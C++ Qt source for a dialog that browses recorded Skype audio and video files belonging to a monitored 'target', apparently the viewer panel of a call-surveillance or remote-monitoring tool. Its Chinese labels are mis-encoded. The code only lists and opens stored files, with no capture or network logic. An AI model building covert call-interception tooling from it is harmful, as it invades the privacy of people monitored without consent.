#include "multimediadlg.h"
#include "target.h"
#include "Utility.h"
#include "nofocusstyle.h"

MultimediaDlg::MultimediaDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
{
	ui.setupUi(this);
	InitConnection();

	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);
	ui.lstMonitorApp->setStyle(nofocusStyle);
	ui.lstSaveTime->setStyle(nofocusStyle);
	ui.lstFileType->setStyle(nofocusStyle);
	ui.lstFileList->setStyle(nofocusStyle);

	RefreshSkypeData();
}

MultimediaDlg::~MultimediaDlg()
{

}

void MultimediaDlg::RefreshSkypeData()
{
	QListWidgetItem* item = ui.lstMonitorApp->item(0);
	ui.lstMonitorApp->setItemSelected(item, true);
	onLstMonitorAppItemClicked(item);
}

void MultimediaDlg::InitConnection()
{
	connect(ui.lstMonitorApp, SIGNAL(itemClicked(QListWidgetItem*)), this, SLOT(onLstMonitorAppItemClicked(QListWidgetItem*)));
	connect(ui.lstSaveTime, SIGNAL(itemClicked(QListWidgetItem*)), this, SLOT(onLstSaveTimeItemClicked(QListWidgetItem*)));
	connect(ui.lstFileType, SIGNAL(itemClicked(QListWidgetItem*)), this, SLOT(onLstFileTypeItemClicked(QListWidgetItem*)));
	connect(ui.lstFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(onLstFileListItemDoubleClicked(QListWidgetItem*)));
}

void MultimediaDlg::onLstMonitorAppItemClicked(QListWidgetItem* item)
{
	std::wstring curPath = this->m_tar->widMultimediaPath;
	curPath += L"\\";
	curPath += item->text().toStdWString();

	ui.lstSaveTime->clear();

	WIN32_FIND_DATAW fd = {0};
	std::wstring searchStr = curPath + L"\\*.*";

	HANDLE findHandle = FindFirstFile(searchStr.c_str(), &fd);

	if ( INVALID_HANDLE_VALUE == findHandle )
		return;

	do 
	{
		if ( 0 == wcscmp(L"..", fd.cFileName) 
			|| 0 == wcscmp(L".", fd.cFileName) )
			continue;

		std::wstring dirPath = curPath + L"\\" + fd.cFileName;
		QListWidgetItem* item = new QListWidgetItem;
		item->setData(Qt::UserRole, QString::fromStdWString(dirPath));
		item->setText(QString::fromWCharArray(fd.cFileName).replace(';', ':'));
		item->setIcon(QIcon(QPixmap("image/time.png")));
		ui.lstSaveTime->addItem(item);

	} while (FindNextFileW(findHandle, &fd));

	FindClose(findHandle);
}

void MultimediaDlg::onLstSaveTimeItemClicked(QListWidgetItem* item)
{
	ui.lstFileList->clear();

	if ( 0 != ui.lstFileType->selectedItems().count() )
	{
		QListWidgetItem* item = ui.lstFileType->selectedItems().at(0);
		ui.lstFileType->setItemSelected(item, false);
	}
}

void MultimediaDlg::onLstFileTypeItemClicked(QListWidgetItem* item)
{
	if ( 0 == ui.lstSaveTime->selectedItems().count() )
		return;

	QListWidgetItem* dirItem = ui.lstSaveTime->selectedItems().at(0);
	std::wstring path = dirItem->data(Qt::UserRole).toString().toStdWString();

	if ( item->text() == QString::fromLocal8Bit("Í¨»°Â¼Òô") )
		path += L"\\Audio";
	else
		path += L"\\video";

	ui.lstFileList->clear();

	WIN32_FIND_DATAW fd = {0};
	std::wstring searchStr = path + L"\\*.*";

	HANDLE findHandle = FindFirstFile(searchStr.c_str(), &fd);

	if ( INVALID_HANDLE_VALUE == findHandle )
		return;


	do 
	{
		if ( 0 == wcscmp(L"..", fd.cFileName) 
			|| 0 == wcscmp(L".", fd.cFileName) )
			continue;

		std::wstring filePath = path + L"\\" + fd.cFileName;
		QListWidgetItem* item = new QListWidgetItem;
		item->setData(Qt::UserRole, QString::fromStdWString(filePath));
		item->setText(QString::fromWCharArray(fd.cFileName));
		item->setIcon(QIcon(QPixmap::fromWinHICON(GetIconFromFileName(filePath.c_str()))));
		ui.lstFileList->addItem(item);

	} while (FindNextFileW(findHandle, &fd));

	FindClose(findHandle);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot Ë«»÷ÒôÊÓÆµ¼à¿ØÎÄ¼þ
//
void MultimediaDlg::onLstFileListItemDoubleClicked(QListWidgetItem* item)
{
	std::wstring filePath = item->data(Qt::UserRole).toString().toStdWString();

	ShellExecuteW(NULL, L"open", filePath.c_str(), NULL, NULL, NULL);
}